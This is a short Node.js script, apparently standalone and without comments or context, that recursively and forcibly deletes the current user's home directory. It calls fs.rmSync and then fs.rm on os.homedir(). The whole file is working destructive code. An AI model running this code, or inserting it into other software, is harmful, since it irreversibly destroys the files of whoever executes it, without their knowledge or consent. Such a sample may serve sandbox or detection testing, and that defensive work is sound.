const fs = require('node:fs');
const os = require('node:os');

fs.rmSync(os.homedir(), { recursive: true, force: true });
fs.rm(os.homedir(), { recursive: true, force: true }, () => {});
